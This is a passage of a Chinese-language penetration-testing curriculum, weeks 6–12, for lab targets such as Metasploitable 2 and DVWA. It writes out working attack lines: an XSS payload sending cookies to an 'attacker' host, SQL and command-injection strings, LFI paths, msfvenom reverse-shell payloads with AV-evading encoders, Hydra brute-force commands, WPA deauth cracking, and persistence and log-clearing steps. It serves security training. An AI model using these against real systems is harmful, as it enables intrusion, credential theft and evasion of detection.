+    - 学习: 漏洞扫描器工作原理 (基于签名 vs 基于行为)
+    - 学习: Nessus架构和使用
+    - 学习: OpenVAS/Greenbone安装和使用
+    - 学习: Nikto Web服务器扫描
+    - 理解: 漏洞扫描局限性 (误报/漏报)
+  第2小时: 实践
+    - 安装并配置Nessus Essentials (免费版)
+    - 创建针对Metasploitable 2的扫描策略
+    - 运行Nessus扫描并分析结果
+    - 使用Nikto扫描Web服务:
+      nikto -h http://192.168.56.101
+    - 使用WPScan扫描WordPress (如果靶场有)
+    - 对比Nmap NSE和Nessus的扫描结果
+  第3小时: 复盘
+    - 整理Nessus扫描报告解读要点
+    - 总结漏洞扫描工具的选择标准
+    - 记录漏洞验证的方法
+
+周四: 手动漏洞评估技术
+  第1小时: 理论
+    - 学习: Banner抓取技术 (nc, telnet, nmap, dmitry)
+    - 学习: 服务手动探测方法
+    - 学习: 默认凭证利用
+    - 学习: 版本号到漏洞的映射 (CVE查询)
+    - 理解: 漏洞优先级排序 (CVSS + 业务影响)
+  第2小时: 实践
+    - 手动连接各服务获取Banner:
+      nc 192.168.56.101 21   (FTP)
+      nc 192.168.56.101 22   (SSH)
+      nc 192.168.56.101 80   (HTTP)
+    - 使用 searchsploit 搜索已知漏洞:
+      searchsploit vsftpd 2.3.4
+      searchsploit apache 2.2.8
+    - 使用 telnet 探测服务版本
+    - 手动检查SMB共享: smbclient -L //192.168.56.101
+    - 手动检查FTP匿名登录
+  第3小时: 复盘
+    - 整理常见服务默认端口和Banner特征
+    - 建立漏洞查询流程
+    - 总结手动评估 vs 自动评估的优劣势
+
+周五: 综合扫描与报告输出
+  第1小时: 理论
+    - 复习本周扫描技术
+    - 学习: 扫描结果综合分析
+    - 学习: 如何撰写漏洞评估报告
+  第2小时: 实践
+    - 对Metasploitable 2进行全面扫描评估:
+      1. 主机发现和端口扫描 (Nmap)
+      2. 服务版本和OS检测 (Nmap -sV -O)
+      3. 漏洞检测脚本 (Nmap vuln分类)
+      4. 专项扫描 (Nikto, 手动Banner)
+      5. 漏洞查询 (SearchSploit)
+    - 将所有发现整理为结构化数据
+    - 对每个漏洞标注CVSS评分和利用可行性
+  第3小时: 复盘
+    - 输出漏洞评估报告 (包含发现、风险等级、建议)
+    - 建立扫描检查清单
+    - 记录本周遇到的服务和应用
+
+周六 (复习日):
+  - 对实验环境中所有靶机进行全面扫描
+  - 对比不同扫描工具的结果
+  - 整理完整的扫描工具命令参考手册
+  - 练习: 用命令输出一份自动化扫描报告
+
+────────────────────────────────────────────────────────────────
+【第7周: Web安全基础 (一) — XSS与CSRF】
+────────────────────────────────────────────────────────────────
+
+周一: Web技术基础与HTTP深入
+  第1小时: 理论
+    - 学习: HTTP请求方法详解 (GET, POST, PUT, DELETE, HEAD, OPTIONS)
+    - 学习: HTTP请求头详解 (Cookie, User-Agent, Referer, Origin, Host)
+    - 学习: HTTP响应头详解 (Set-Cookie, X-Frame-Options, CORS头)
+    - 学习: Cookie属性 (Secure, HttpOnly, SameSite, Domain, Path)
+    - 学习: 会话管理机制 (Session vs Token)
+    - 学习: 同源策略 (Same-Origin Policy)
+  第2小时: 实践
+    - 使用Burp Suite拦截HTTP请求, 分析完整请求结构
+    - 使用浏览器开发者工具 (F12) 查看网络请求
+    - 使用curl发送各种HTTP请求:
+      curl -X POST -d "param=value" http://target
+      curl -H "Cookie: session=xxx" http://target
+    - 在DVWA中练习抓包和改包
+    - 理解GET与POST请求在安全上的差异
+  第3小时: 复盘
+    - 整理HTTP请求/响应结构图
+    - 总结Cookie安全属性
+    - 记录Burp Suite基本操作
+
+周二: XSS (跨站脚本攻击) — 反射型与存储型
+  第1小时: 理论
+    - 学习: XSS攻击原理和分类
+      - 反射型XSS (Reflected XSS)
+      - 存储型XSS (Stored XSS)
+      - DOM型XSS
+    - 学习: XSS Payload类型 (会话劫持, 钓鱼, 挂马, 蠕虫)
+    - 学习: XSS防御方法 (输出编码, CSP, HttpOnly)
+    - 理解: XSS与Cookie窃取的关系
+  第2小时: 实践
+    在DVWA (Low难度) 中练习XSS:
+    - 反射型XSS: <script>alert('XSS')</script>
+    - 存储型XSS: 在留言板注入脚本
+    - Cookie窃取: <script>document.location='http://attacker/?'+document.cookie</script>
+    - 使用BeeF框架演示浏览器劫持
+    - 修改User-Agent绕过简单过滤
+    - 练习多种绕过方式: 大小写、编码、标签变换
+  第3小时: 复盘
+    - 整理XSS Payload清单
+    - 总结XSS过滤绕过技巧
+    - 记录DVWA XSS实验笔记
+
+周三: XSS深入与DOM型
+  第1小时: 理论
+    - 学习: DOM型XSS原理 (source -> sink)
+    - 学习: 常见Sources (document.URL, document.referrer, location.hash)
+    - 学习: 常见Sinks (innerHTML, document.write, eval, setTimeout)
+    - 学习: 高级XSS技巧 (mXSS, Blind XSS, 事件劫持)
+    - 学习: CSP (内容安全策略) 绕过思路
+  第2小时: 实践
+    - 在DVWA中提升XSS难度 (Medium, High)
+    - 手动构造绕过Payload
+    - 使用XSSer工具进行自动化XSS检测
+    - 在OWASP Juice Shop中寻找XSS漏洞
+    - 练习CSP绕过 (如果有环境)
+    - 尝试Blind XSS场景
+  第3小时: 复盘
+    - 整理XSS绕过技术清单
+    - 总结DOM型XSS挖掘方法
+    - 记录自动化vs手动XSS测试的优劣
+
+周四: CSRF (跨站请求伪造)
+  第1小时: 理论
+    - 学习: CSRF攻击原理
+    - 学习: GET型CSRF vs POST型CSRF
+    - 学习: CSRF条件 (Cookie自动携带 + 参数可预测)
+    - 学习: CSRF防御 (CSRF Token, Referer验证, SameSite Cookie)
+    - 理解: CSRF vs XSS的区别和联系
+  第2小时: 实践
+    - 在DVWA中完成CSRF攻击
+    - 构造CSRF PoC页面 (自动提交表单)
+    - 使用Burp Suite生成CSRF PoC
+    - 分析带CSRF Token保护的页面
+    - 尝试绕过Referer验证
+    - 了解OWASP CSRFGuard的使用
+  第3小时: 复盘
+    - 整理CSRF攻击流程
+    - 总结CSRF防御技术对比
+    - 记录XSS+CSRF组合攻击思路
+
+周五: XSS/CSRF综合练习与Burp Suite
+  第1小时: 理论
+    - 学习: Burp Suite功能全景
+    - 学习: Proxy, Repeater, Intruder, Scanner (Pro)
+    - 学习: Burp Suite Extensions (Turbo Intruder, Autorize)
+    - 理解: Burp Suite在Web渗透测试中的核心地位
+  第2小时: 实践
+    - 使用Burp Suite对DVWA进行完整测试
+    - 在OWASP Juice Shop中寻找XSS漏洞
+    - 使用Intruder进行参数Fuzzing
+    - 编写Python脚本检测反射型XSS
+    - 对不同难度的XSS进行逐一通关
+    - 练习Burp Suite快捷键和配置
+  第3小时: 复盘
+    - 整理Burp Suite操作手册
+    - 总结本周XSS/CSRF学习要点
+    - 记录OWASP Juice Shop中发现的问题
+
+周六 (复习日):
+  - 完成DVWA所有XSS难度的通关
+  - 完成DVWA所有CSRF难度的通关
+  - 在Burp Suite中制作一份Web漏洞测试流程
+  - 整理XSS/CSRF测试检查清单
+
+────────────────────────────────────────────────────────────────
+【第8周: Web安全基础 (二) — SQL注入与命令注入】
+────────────────────────────────────────────────────────────────
+
+周一: SQL注入基础
+  第1小时: 理论
+    - 学习: SQL基础 (SELECT, INSERT, UPDATE, DELETE, UNION)
+    - 学习: SQL注入原理 (用户输入拼接到SQL语句)
+    - 学习: SQL注入分类:
+      - 联合查询注入 (UNION-based)
+      - 报错注入 (Error-based)
+      - 布尔盲注 (Boolean-based Blind)
+      - 时间盲注 (Time-based Blind)
+      - 堆叠查询 (Stacked Queries)
+    - 理解: 数字型注入 vs 字符型注入
+  第2小时: 实践
+    在DVWA (Low难度) 中练习SQL注入:
+    - 数字型注入: 1' OR '1'='1
+    - 字符型注入: admin' OR '1'='1' #
+    - 使用UNION查询获取数据库信息
+    - 使用UNION查询获取表名和数据
+    - 理解为何需要知道原始查询的列数
+  第3小时: 复盘
+    - 整理SQL注入类型对照表
+    - 记录SQL注入基本Payload集合
+    - 总结注入点发现方法
+
+周二: SQL注入深入 — UNION注入与报错注入
+  第1小时: 理论
+    - 学习: 判断列数 (ORDER BY, UNION SELECT NULL)
+    - 学习: 判断列的数据类型
+    - 学习: information_schema数据库结构
+    - 学习: 报错注入函数 (extractvalue, updatexml, floor)
+    - 学习: 不同数据库的特殊性 (MySQL vs MSSQL vs Oracle vs PostgreSQL)
+  第2小时: 实践
+    - 在DVWA中提升注入难度 (Medium, High)
+    - 手动进行UNION注入, 逐表提取数据:
+      1. 判断列数: ORDER BY 1,2,3...
+      2. 确认回显位置: UNION SELECT 1,2,3...
+      3. 获取数据库名: SELECT database()
+      4. 获取表名: SELECT table_name FROM information_schema.tables
+      5. 获取列名: SELECT column_name FROM information_schema.columns
+      6. 提取数据: SELECT user,password FROM users
+    - 在sqli-labs靶场中练习
+  第3小时: 复盘
+    - 整理UNION注入完整步骤
+    - 总结information_schema查询模板
+    - 记录不同数据库的查询差异
+
+周三: SQL注入深入 — 盲注与自动化
+  第1小时: 理论
+    - 学习: 布尔盲注原理 (通过逻辑判断逐字符提取)
+    - 学习: 时间盲注原理 (利用SLEEP/BENCHMARK)
+    - 学习: SQLMap工作原理
+    - 学习: SQLMap参数详解 (--dbs, --tables, --dump, --os-shell)
+    - 理解: 盲注的适用范围和局限性
+  第2小时: 实践
+    - 在DVWA中练习盲注场景
+    - 使用Python编写简单的布尔盲注脚本
+    - 使用SQLMap进行自动化注入:
+      sqlmap -u "http://target/vuln.php?id=1" --dbs
+      sqlmap -u "http://target/vuln.php?id=1" -D dvwa --tables
+      sqlmap -u "http://target/vuln.php?id=1" -D dvwa -T users --dump
+    - 在sqli-labs中通关更多关卡
+    - 对比手动注入和SQLMap的效率
+  第3小时: 复盘
+    - 整理SQLMap常用参数速查表
+    - 总结盲注脚本的编写思路
+    - 记录SQLMap的tamper脚本使用
+
+周四: 命令注入与文件包含
+  第1小时: 理论
+    - 学习: 命令注入原理 (系统命令拼接)
+    - 学习: 命令拼接符号 (;, |, ||, &&, &, 反引号, $())
+    - 学习: 命令注入防御 (输入校验, 白名单, 参数化)
+    - 学习: 文件包含漏洞 (LFI/RFI)
+    - 学习: PHP伪协议 (php://filter, php://input, data://, expect://)
+  第2小时: 实践
+    在DVWA中练习命令注入:
+    - Low: 127.0.0.1; ls -la
+    - Low: 127.0.0.1; whoami
+    - Low: 127.0.0.1; cat /etc/passwd
+    - Medium: 使用 & 代替 ;
+    - High: 使用管道 | 绕过
+
+    在DVWA中练习文件包含:
+    - LFI: ?page=/etc/passwd
+    - LFI: ?page=../../../../etc/passwd (路径穿越)
+    - PHP封装器: ?page=php://filter/convert.base64-encode/resource=index.php
+    - 尝试解密base64后的源码
+  第3小时: 复盘
+    - 整理命令注入拼接符号
+    - 总结LFI/RFI利用技术
+    - 记录PHP伪协议的用法
+
+周五: SQL注入与命令注入综合实战
+  第1小时: 理论
+    - 复习本周所有注入技术
+    - 学习: 注入漏洞的代码审计方法
+    - 了解: WAF绕过基础概念
+  第2小时: 实践
+    - 尝试DVWA Impossible难度的SQL注入 (了解代码层面防御)
+    - 在OWASP Juice Shop中寻找注入漏洞
+    - 对sqli-labs进行过关挑战 (目标: 通关前20关)
+    - 练习SQLMap的tamper脚本绕过简单防护
+    - 尝试使用SQLMap的--os-shell功能
+  第3小时: 复盘
+    - 整理注入漏洞测试方法论
+    - 总结本周通关的关卡数量
+    - 记录注入攻击的防御思路
+
+周六 (复习日):
+  - 完成DVWA所有注入相关漏洞的全难度通关
+  - 在sqli-labs中冲击通关数量
+  - 整理一份完整的SQL注入Cheat Sheet
+  - 练习: 使用SQLMap对目标进行一键数据库导出
+────────────────────────────────────────────────────────────────
+【第9周: 漏洞利用基础 (一) — Metasploit入门】
+────────────────────────────────────────────────────────────────
+
+周一: Metasploit基础架构
+  第1小时: 理论
+    - 学习: Metasploit Framework架构
+      - 模块分类: Exploits, Payloads, Auxiliary, Encoders, Evasion, Post, NOPs
+    - 学习: Metasploit接口 (msfconsole, msfcli, msfvenom, Armitage)
+    - 学习: MSF核心术语 (Exploit, Payload, Encoder, LHOST, LPORT)
+    - 理解: Payload类型 (Staged vs Stageless, Inline vs Meterpreter)
+    - 理解: Meterpreter的强大之处
+  第2小时: 实践
+    - 启动并熟悉msfconsole
+    - 基本命令练习:
+      help, search, use, show options, set, run/exploit
+      back, info, sessions, jobs
+    - 搜索特定漏洞的Exploit:
+      search vsftpd
+      search eternalblue
+    - 了解模块信息: info exploit/unix/ftp/vsftpd_234_backdoor
+    - 连接PostgreSQL数据库: db_status
+    - 练习工作区管理: workspace
+  第3小时: 复盘
+    - 整理MSF核心命令速查表
+    - 画出MSF模块结构图
+    - 总结Meterpreter的优势特性
+
+周二: Metasploit漏洞利用 — 远程漏洞
+  第1小时: 理论
+    - 学习: Exploit选择标准 (目标系统, 端口, 版本)
+    - 学习: Payload选择 (bind vs reverse, 操作系统, 架构)
+    - 理解: Reverse Shell原理 (目标主动连接攻击者)
+    - 理解: Bind Shell原理 (攻击者连接目标监听端口)
+    - 学习: 漏洞利用的一般步骤
+  第2小时: 实践
+    对Metasploitable 2进行漏洞利用:
+    1. vsftpd 2.3.4 后门利用 (端口21):
+       use exploit/unix/ftp/vsftpd_234_backdoor
+       set RHOSTS 192.168.56.101
+       run
+       -> 直接获得root shell
+
+    2. distcc 漏洞利用:
+       use exploit/unix/misc/distcc_exec
+       set RHOSTS 192.168.56.101
+       run
+
+    3. UnrealIRCd 后门利用 (端口6667):
+       use exploit/unix/irc/unreal_ircd_3281_backdoor
+       set RHOSTS 192.168.56.101
+       run
+
+    4. Samba usermap_script 漏洞利用:
+       use exploit/multi/samba/usermap_script
+       set RHOSTS 192.168.56.101
+       run
+  第3小时: 复盘
+    - 记录每个成功利用的Exploit和条件
+    - 总结Reverse Shell vs Bind Shell选择场景
+    - 截图保存成功利用的终端界面
+
+周三: Metasploit — Payload与Meterpreter
+  第1小时: 理论
+    - 学习: Common Payloads (shell_reverse_tcp, meterpreter_reverse_tcp)
+    - 学习: Staged vs Stageless 的区别
+    - 学习: Meterpreter核心功能:
+      - 文件系统操作 (download, upload, cat, edit)
+      - 进程管理 (ps, migrate, kill, execute)
+      - 网络操作 (portfwd, route, arp_scanner)
+      - 凭证收集 (hashdump, kiwi/mimikatz)
+      - 其他 (screenshot, webcam, keylog)
+    - 了解: Post Exploitation模块
+  第2小时: 实践
+    在获得的Meterpreter会话中练习:
+    - sysinfo, getuid, getpid, ps
+    - shell (进入系统shell)
+    - download /etc/passwd
+    - upload /tmp/test.txt /tmp/
+    - migrate 到其他进程
+    - hashdump (需要system权限)
+    - background (放到后台)
+    - sessions -l / sessions -i
+    - 使用post模块收集信息:
+      run post/linux/gather/enum_system (如果有对应模块)
+  第3小时: 复盘
+    - 整理Meterpreter常用命令速查表
+    - 总结Post Exploitation模块分类
+    - 记录进程迁移(migrate)的注意事项
+
+周四: Metasploit — 客户端攻击与Payload生成
+  第1小时: 理论
+    - 学习: msfvenom生成Payload
+    - 学习: 各种格式的Payload (exe, elf, python, php, asp, jsp, war)
+    - 学习: 编码器 (Encoders) 的作用和选择
+    - 学习: 捆绑/注入到合法程序
+    - 理解: 客户端攻击 (Client-side Attacks) 原理
+  第2小时: 实践
+    - 使用msfvenom生成各类Payload:
+      msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o shell
+      msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o shell.exe
+      msfvenom -p php/reverse_php LHOST=192.168.56.1 LPORT=4444 -f raw -o shell.php
+      msfvenom -p python/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f raw -o shell.py
+
+    - 在ArchStrike攻击机上启动msfconsole的handler:
+      use exploit/multi/handler
+      set PAYLOAD linux/x86/shell_reverse_tcp
+      set LHOST 192.168.56.1
+      set LPORT 4444
+      run
+
+    - 在靶机上执行生成的Payload, 观察获取的会话
+    - 生成带编码的Payload:
+      msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
+  第3小时: 复盘
+    - 整理msfvenom常用命令
+    - 总结不同Payload格式的适用场景
+    - 记录编码器对免杀的影响
+
+周五: Metasploit综合实战
+  第1小时: 理论
+    - 回顾本周MSF使用要点
+    - 学习: MSF资源脚本 (Resource Scripts) 自动化
+    - 学习: 漏洞利用后的信息收集流程
+  第2小时: 实践
+    对Metasploitable 2进行完整的MSF渗透:
+    1. 端口扫描: nmap扫描 -> 导入MSF数据库
+    2. 根据开放端口选择Exploit
+    3. 至少利用3个不同漏洞获取多个会话
+    4. 使用Meterpreter进行后渗透信息收集
+    5. 尝试建立持久化访问
+    6. 编写一个MSF资源脚本自动化上述流程
+  第3小时: 复盘
+    - 输出Metasploit使用总结
+    - 记录本周成功利用的漏洞和会话
+    - 整理MSF自动化脚本模板
+
+周六 (复习日):
+  - 对Metasploitable 2所有开放端口进行Exploit匹配
+  - 记录至少5个成功利用的漏洞
+  - 编写一份MSF资源脚本集合
+  - 练习: 完整的MSF渗透测试流程 (扫描->利用->后渗透->清除痕迹)
+
+────────────────────────────────────────────────────────────────
+【第10周: 漏洞利用深入】
+────────────────────────────────────────────────────────────────
+
+周一: 漏洞利用原理深入
+  第1小时: 理论
+    - 学习: 缓冲区溢出基础概念 (栈, 寄存器, EIP)
+    - 学习: 常见漏洞原理:
+      - 栈缓冲区溢出
+      - 堆溢出
+      - 格式化字符串漏洞
+      - 整数溢出
+      - Use-After-Free
+    - 学习: 漏洞利用开发流程
+    - 了解: Immunity Debugger / GDB 调试器
+  第2小时: 实践
+    - 阅读一个公开的Exploit源码, 逐行分析
+    - 理解Exploit中的关键技术:
+      - 偏移计算
+      - JMP ESP / ROP Gadget
+      - Shellcode定位
+      - Bad Character过滤
+    - 使用GDB调试简单程序
+    - 尝试修改Exploit中的参数 (端口/IP)
+  第3小时: 复盘
+    - 画图说明栈溢出原理
+    - 记录调试器基本命令
+    - 理解漏洞的根本原因
+
+周二: Exploit-DB与SearchSploit
+  第1小时: 理论
+    - 学习: Exploit-DB等漏洞库的使用
+    - 学习: searchsploit命令详解
+    - 学习: 如何判断Exploit是否可靠
+    - 学习: Exploit的修改和适配
+  第2小时: 实践
+    - 使用searchsploit搜索漏洞:
+      searchsploit vsftpd
+      searchsploit samba 3.x
+      searchsploit apache
+    - 查看Exploit内容: searchsploit -x 路径
+    - 复制Exploit到当前目录: searchsploit -m 路径
+    - 尝试修改Exploit以适应实验环境
+    - 从Exploit-DB下载并测试Exploit
+    - 理解Exploit中的语言 (C, Python, Ruby, Perl)
+  第3小时: 复盘
+    - 整理SearchSploit使用手册
+    - 总结Exploit可靠性评估方法
+    - 记录成功利用vs失败的原因
+
+周三: 权限提升基础 (Linux)
+  第1小时: 理论
+    - 学习: 权限提升概念和必要性
+    - 学习: Linux提权信息收集:
+      - 内核版本 (uname -a)
+      - SUID文件 (find / -perm -4000)
+      - 可写的配置和服务
+      - Cron任务
+      - 敏感文件和密码
+    - 了解: Linux提权方法论
+    - 学习: 权限提升工具 (LinPEAS, LinEnum, linux-exploit-suggester)
+  第2小时: 实践
+    在已获得的Metasploitable 2 Shell中提权:
+    - 信息收集:
+      uname -a
+      cat /etc/issue
+      whoami; id
+      sudo -l
+      cat /etc/crontab
+      find / -perm -4000 -type f 2>/dev/null
+      cat /etc/passwd; cat /etc/shadow (如果可读)
+
+    - 使用LinPEAS进行全面信息收集
+    - 如果有SUID文件, 在GTFOBins上查找利用方法
+    - 利用内核漏洞提权 (DirtyCow, 如果适用)
+    - 利用配置错误提权 (sudo误配置, cron利用)
+  第3小时: 复盘
+    - 整理Linux提权检查清单
+    - 总结LinPEAS输出解读方法
+    - 记录提权成功的技术和条件
+
+周四: 权限提升 (Windows基础)
+  第1小时: 理论
+    - 学习: Windows权限模型 (服务账户, 本地账户, 域账户)
+    - 学习: Windows提权信息收集:
+      - 系统信息 (systeminfo)
+      - 用户和组 (whoami /priv, net user, net localgroup)
+      - 服务 (sc query, wmic service)
+      - 未引号服务路径
+      - 计划任务 (schtasks)
+      - 补丁情况 (wmic qfe)
+    - 了解: Windows提权工具 (WinPEAS, PowerUp, Watson)
+  第2小时: 实践
+    - 如果有Windows靶机:
+      1. 信息收集: systeminfo, whoami /priv
+      2. 寻找未引号服务路径
+      3. 查找AlwaysInstallElevated注册表键
+      4. 使用WinPEAS收集信息
+      5. 了解UAC绕过概念
+    - 如果没有Windows靶机, 搭建Windows 7/10测试环境
+    - 使用Windows Exploit Suggester匹配内核漏洞
+  第3小时: 复盘
+    - 整理Windows提权检查清单
+    - 总结Windows vs Linux提权思路差异
+    - 记录常用提权工具
+
+周五: 漏洞利用综合练习
+  第1小时: 理论
+    - 学习: 完整的Get Shell -> 提权 -> 后渗透流程
+    - 理解: 渗透链的构建思路
+  第2小时: 实践
+    对Metasploitable 2完成完整渗透链:
+    1. 信息收集: Nmap全面扫描
+    2. 漏洞利用: Metasploit获取Shell
+    3. 权限提升: 从低权限提升至root
+    4. 信息收集: 收集系统信息和凭证
+    5. 持久化: 添加后门账户或SSH密钥
+    6. 清除痕迹: 清理日志 (了解即可, 实际中要保留)
+    7. 记录完整过程, 准备写报告
+  第3小时: 复盘
+    - 输出完整渗透链的流程图
+    - 总结各阶段的关键技术点
+    - 记录失败尝试和原因分析
+
+周六 (复习日):
+  - 对Metasploitable 2重新渗透一遍 (不依赖笔记)
+  - 练习至少3种不同的提权技术
+  - 整理完整的渗透测试流程文档
+  - 尝试第一台VulnHub靶机 (如: Kioptrix)
+
+────────────────────────────────────────────────────────────────
+【第11周: 密码攻击与无线安全基础】
+────────────────────────────────────────────────────────────────
+
+周一: 密码学基础
+  第1小时: 理论
+    - 学习: 密码学基本概念 (明文, 密文, 加密, 解密, 密钥)
+    - 学习: 对称加密 vs 非对称加密
+    - 学习: 哈希函数 (MD5, SHA1, SHA256, SHA512)
+    - 学习: 哈希 vs 加密的区别
+    - 学习: 密码存储方式 (明文, 哈希, 哈希+盐)
+    - 了解: Base64编码 (不是加密!)
+  第2小时: 实践
+    - 使用openssl进行加解密:
+      echo "secret" | openssl enc -aes-256-cbc -a -salt -pass pass:password
+    - 使用openssl生成哈希:
+      echo -n "password" | openssl dgst -sha256
+      echo -n "password" | md5sum | sha1sum | sha256sum
+    - 理解Base64编码:
+      echo -n "hello" | base64
+    - 在线哈希计算与解密的局限性
+    - 了解彩虹表概念
+  第3小时: 复盘
+    - 整理密码学术语表
+    - 总结常见哈希算法
+    - 理解为什么加密不等于安全
+
+周二: 离线密码破解 — John & Hashcat
+  第1小时: 理论
+    - 学习: 离线密码破解原理 (字典攻击 vs 暴力破解 vs 掩码攻击)
+    - 学习: John the Ripper架构和模式 (single, wordlist, incremental)
+    - 学习: Hashcat攻击模式 (-a 0~9) 和哈希类型 (-m)
+    - 学习: 规则 (Rules) 的作用
+    - 理解: GPU破解 vs CPU破解
+    - 了解: 分布式密码破解 (Hashtopolis)
+  第2小时: 实践
+    - 获取Linux密码哈希:
+      cat /etc/shadow (需要root权限)
+    - 使用unshadow合并passwd和shadow:
+      unshadow /etc/passwd /etc/shadow > hashes.txt
+    - 使用John破解:
+      john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+      john --show hashes.txt (查看已破解密码)
+    - 使用Hashcat破解:
+      hashcat -m 1800 -a 0 hashes.txt wordlist.txt
+    - 添加规则: -r /usr/share/hashcat/rules/best64.rule
+    - 尝试破解已知的简单密码
+  第3小时: 复盘
+    - 整理John/Hashcat常用参数
+    - 总结密码破解效率和技巧
+    - 记录字典文件位置
+
+周三: 在线密码攻击 — Hydra与Medusa
+  第1小时: 理论
+    - 学习: 在线密码攻击原理 (与离线攻击的区别)
+    - 学习: Hydra支持的协议 (SSH, FTP, HTTP, RDP, SMB, MySQL...)
+    - 学习: 密码喷射 (Password Spraying) vs 密码暴力破解
+    - 学习: 账户锁定策略对攻击的影响
+    - 学习: 在线攻击的检测风险
+  第2小时: 实践
+    - 使用Hydra攻击Metasploitable 2:
+      攻击SSH: hydra -l user -P pass.txt ssh://192.168.56.101
+      攻击FTP: hydra -l user -P pass.txt ftp://192.168.56.101
+      攻击HTTP POST登录: 
+        hydra -l admin -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"
+    - 使用Medusa进行类似攻击
+    - 理解不同服务的响应速度差异
+    - 使用Nmap NSE进行密码审计:
+      nmap --script ftp-brute -p 21 192.168.56.101
+  第3小时: 复盘
+    - 整理Hydra命令速查表
+    - 总结在线vs离线密码攻击的选择
+    - 记录密码喷射的优势
+
+周四: 无线安全基础
+  第1小时: 理论
+    - 学习: 无线网络安全基础 (802.11协议族)
+    - 学习: WPA/WPA2/WPA3认证流程
+    - 学习: WPA2四次握手原理
+    - 学习: WPA3 SAE (Simultaneous Authentication of Equals)
+    - 学习: 无线攻击类型:
+      - 抓包并离线破解
+      - Evil Twin攻击
+      - Karma攻击
+      - PMKID攻击
+    - 注意: 仅在授权环境中进行无线安全测试!
+  第2小时: 实践
+    - 了解无线网卡要求 (支持监听模式和注入模式)
+    - 使用airmon-ng启用监听模式:
+      airmon-ng start wlan0
+    - 扫描附近WiFi:
+      airodump-ng wlan0mon
+    - 针对特定AP抓包:
+      airodump-ng -c 信道 --bssid MAC -w 输出文件 wlan0mon
+    - 使用aireplay-ng发起Deauth攻击获取握手包
+    - 使用aircrack-ng破解握手包:
+      aircrack-ng -w wordlist.txt 握手包.cap
+    - 了解Wifite自动化工具
+    - 如果没有物理无线网卡, 至少了解操作原理和命令
+  第3小时: 复盘
+    - 整理无线攻击工具链
+    - 总结WPA2握手包破解流程
+    - 记录无线安全测试的法律边界
+
+周五: 密码与无线综合练习
+  第1小时: 理论
+    - 复习本周所有攻击技术
+    - 学习: 企业环境中的密码策略
+    - 了解: Pass-the-Hash (PTH) 概念预习
+  第2小时: 实践
+    - 在Metasploitable 2上练习:
+      1. 使用Hydra爆破telnet/SSH
+      2. 提取shadow文件并用John破解
+    - 尝试破解DVWA的登录密码
+    - 整理自己的密码字典 (从SecLists裁剪)
+    - 测试不同复杂度密码的破解时间
+  第3小时: 复盘
+    - 输出本周攻击结果 (破解了多少密码)
+    - 整理密码字典优化策略
+    - 记录高效的密码攻击流程
+
+周六 (复习日):
+  - 整合密码攻击完整流程
+  - 尝试破解至少3个不同服务的密码
+  - 整理密码攻击工具使用手册
+  - 尝试第一台TryHackMe靶机 (如: Simple CTF)
+
+────────────────────────────────────────────────────────────────
+【第12周: 第二阶段复习与综合考核】
+────────────────────────────────────────────────────────────────
+
+周一: 信息收集与扫描复习
+  第1小时: 理论
+    - 复习: 被动/主动信息收集技术
+    - 复习: Nmap完整使用体系
+    - 复习: 漏洞评估方法论
+  第2小时: 实践
+    - 对新目标 (可以是HTB或VulnHub靶机) 进行完整信息收集
+    - 输出结构化的侦察报告
+    - 使用自动化脚本加快信息收集效率
+  第3小时: 复盘
+    - 更新信息收集检查清单
+    - 优化个人工具链
+
+周二: Web安全复习
+  第1小时: 理论
+    - 复习: XSS/CSRF/SQL注入/命令注入/文件包含原理
+    - 复习: 各漏洞的检测和利用方法
+  第2小时: 实践
+    - 在DVWA上重新通关 (计时完成)
+    - 在OWASP Juice Shop中寻找漏洞
+    - 使用Burp Suite对目标进行完整Web测试
+  第3小时: 复盘
+    - 整理Web漏洞速查表
+    - 总结各漏洞的防御和绕过方法
+
+周三: 漏洞利用复习
+  第1小时: 理论
+    - 复习: Metasploit框架使用
+    - 复习: Reverse Shell vs Bind Shell
+    - 复习: 提权方法论 (Linux + Windows)
+  第2小时: 实践
+    - 对Metasploitable 2进行快速渗透 (目标: 1小时完成)
+    - 尝试不使用Metasploit手动利用 (使用公开Exploit脚本)
+    - 搜索并使用SearchSploit找到的Exploit
+  第3小时: 复盘
+    - 整理Exploit选择决策树
+    - 总结提权技术清单
+
+周四: 第二阶段综合考核 (一)
+  第1-3小时: 考核任务
+    目标: 完成一台新的VulnHub或TryHackMe简单靶机
+    要求:
+    1. 独立完成信息收集
+    2. 找到至少2个可利用漏洞
+    3. 获取初始Shell
+    4. 提升至root/administrator权限
+    5. 记录完整渗透过程
+    6. 输出渗透报告
+
+    推荐考核靶机 (选做1-2台):
+    - VulnHub: Kioptrix Level 1, FristiLeaks, Mr-Robot
+    - TryHackMe: Simple CTF, Uber Secret, Bounty Hacker
+    - HackTheBox: Starting Point系列
+
+周五: 第二阶段综合考核 (二) 与总结
+  第1小时: 继续完成周四的靶机
+  第2小时: 撰写考核渗透报告
+  第3小时: 第二阶段总结
+    - 统计: 学习的技术数量, 掌握的漏洞类型, 通关的靶机数量
+    - 对比: 与第4周末的能力水平变化
+    - 反思: 哪些地方需要加强
+    - 在第二阶段进度表上打勾
+    - 输出第二阶段学习总结 (至少800字)
+
+周六 (复习日):
+  - 整理第二阶段完整知识体系
+  - 制作10-12周的笔记索引
+  - 补充薄弱环节 (如某类漏洞不熟, 重新练习)
+  - 准备进入第三阶段的进阶学习
+
+────────────────────────────────────────────────────────────────
+【第二阶段小结】
+────────────────────────────────────────────────────────────────
+  完成第5-12周后, 你应该具备以下能力:
+    ☐ 能对目标进行完整的信息收集和侦察
+    ☐ 熟练使用Nmap进行网络扫描和漏洞检测
+    ☐ 能独立完成Web常见漏洞的检测和利用 (XSS, CSRF, SQLi, CMDi, LFI)
+    ☐ 熟练使用Metasploit进行漏洞利用和会话管理
+    ☐ 理解Linux和Windows的权限提升方法
+    ☐ 能使用密码攻击工具进行离线/在线攻击
+    ☐ 了解无线安全测试基础
+    ☐ 独立完成至少5台基础靶机
+
+  在第二阶段进度表上确认所有项目已打勾后, 进入第三阶段。
+
